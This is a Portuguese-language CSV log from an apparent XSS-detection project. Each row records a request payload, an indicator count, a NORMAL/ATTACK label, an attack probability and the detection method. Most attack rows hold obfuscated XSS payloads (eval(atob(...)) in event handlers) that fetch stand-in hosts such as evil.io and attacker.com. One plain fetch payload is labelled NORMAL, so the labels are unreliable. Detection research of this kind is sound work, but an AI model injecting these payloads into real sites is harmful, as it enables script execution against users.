Data/Hora,IP,Payload,Indicadores_XSS,Classificacao,Probabilidade_Ataque_IA,Tipo_Deteccao
2026-05-11T16:02:46.777-03:00,10.0.0.15,"{""active_users"":45}",0,NORMAL,1.1%,(Normal)
2026-05-11T16:02:47.888-03:00,192.168.1.25,"{""nome"":""<keygen/onfocus=eval(atob('ZmV0Y2goJy8vZXZpbC5pbycp'))>""}",6,ATAQUE,92.7%,(Random_Forest)
2026-05-11T16:02:48.999-03:00,177.0.0.1,"{""server_log"":""Memory cleanup at 16:02:00.""}",0,NORMAL,1.8%,(Normal)
2026-05-11T16:02:50.111-03:00,10.0.0.8,"{""payload"":""<frameset/onload=eval(atob('ZmV0Y2goJy8vYXR0YWNrZXIuY29tJyk='))>""}",9,ATAQUE,94.3%,(Regex_Redundante)
2026-05-11T16:02:51.222-03:00,192.168.0.1,"{""msg"":""O modelo está respondendo bem a ataques ofuscados.""}",0,NORMAL,28.4%,(Normal)
2026-05-11T16:02:52.333-03:00,189.5.5.5,"{""nome"":""<svg/onload=fetch('//malicious.site')>""}",5,NORMAL,73.6%,(Normal)
2026-05-11T16:02:53.444-03:00,192.168.1.10,"{""status"":""final-check"",""ready"":true}",0,NORMAL,1.5%,(Normal)
2026-05-11T16:02:54.555-03:00,10.0.0.5,"{""nome"":""<script>eval(atob('ZmV0Y2goJy8vYXR0YWNrZXIuY29tJyk='))</script>""}",11,ATAQUE,96.5%,(Regex_Redundante)
2026-05-11T16:02:55.666-03:00,172.16.0.1,"{""search_history"":[""machine learning"",""cybersecurity"",""python""]}",0,NORMAL,7.7%,(Normal)
2026-05-11T16:02:56.777-03:00,189.55.1.4,"{""comment"":""<img/src=1/onerror=eval(atob('ZmV0Y2goJy8vZXZpbC5jb20nKQ=='))>""}",9,ATAQUE,94.9%,(Regex_Redundante)
2026-05-11T16:02:57.888-03:00,192.168.1.15,"{""system_health"":""excellent""}",0,NORMAL,1.3%,(Normal)
2026-05-11T16:02:58.999-03:00,10.0.0.8,"{""payload"":""<svg/onmouseover=eval(atob('ZmV0Y2goJy8vYXR0YWNrZXIubmV0Jyk='))>""}",7,ATAQUE,78.8%,(Filtro_Regex)
2026-05-11T16:03:00.111-03:00,177.44.22.10,"{""role"":""student"",""institution"":""IFSP""}",0,NORMAL,1.5%,(Normal)
2026-05-11T16:03:01.222-03:00,187.1.55.99,"{""nome"":""<details/open/ontoggle=eval(atob('ZmV0Y2goJy8vZXZpbC5pbycp'))>""}",7,ATAQUE,92.9%,(Regex_Redundante)
2026-05-11T16:03:02.333-03:00,192.168.0.100,"{""id"":123,""value"":""test-data""}",0,NORMAL,1.5%,(Normal)
2026-05-11T16:03:03.444-03:00,10.0.0.12,"{""msg"":""<body/onload=eval(atob('ZmV0Y2goJy8vYXR0YWNrZXIubmV0Jyk='))>""}",9,ATAQUE,93.1%,(Regex_Redundante)
2026-05-11T16:03:04.555-03:00,172.16.1.1,"{""final_note"":""O projeto está concluído.""}",0,NORMAL,0.8%,(Normal)
2026-05-11T16:03:05.666-03:00,189.10.20.30,"{""xss"":""<audio/src/onerror=eval(atob('ZmV0Y2goJy8vZXZpbC5jb20nKQ=='))>""}",9,ATAQUE,92.8%,(Regex_Redundante)
2026-05-11T16:03:06.777-03:00,10.0.0.1,"{""session"":""closed""}",0,NORMAL,1.1%,(Normal)
2026-05-11T16:03:07.888-03:00,177.88.99.1,"{""nome"":""<input/onfocus=eval(atob('ZmV0Y2goJy8vYXR0YWNrZXIuaW8nKQ=='))/autofocus>""}",6,ATAQUE,99.6%,(Random_Forest)
2026-05-11T16:03:08.999-03:00,192.168.1.1,"{""success"":true}",0,NORMAL,1.1%,(Normal)
2026-05-11T16:03:10.111-03:00,10.0.0.5,"{""nome"":""<video><source/onerror=eval(atob('ZmV0Y2goJy8vZXZpbC5uZXQnKQ=='))></video>""}",9,ATAQUE,99.9%,(Regex_Redundante)
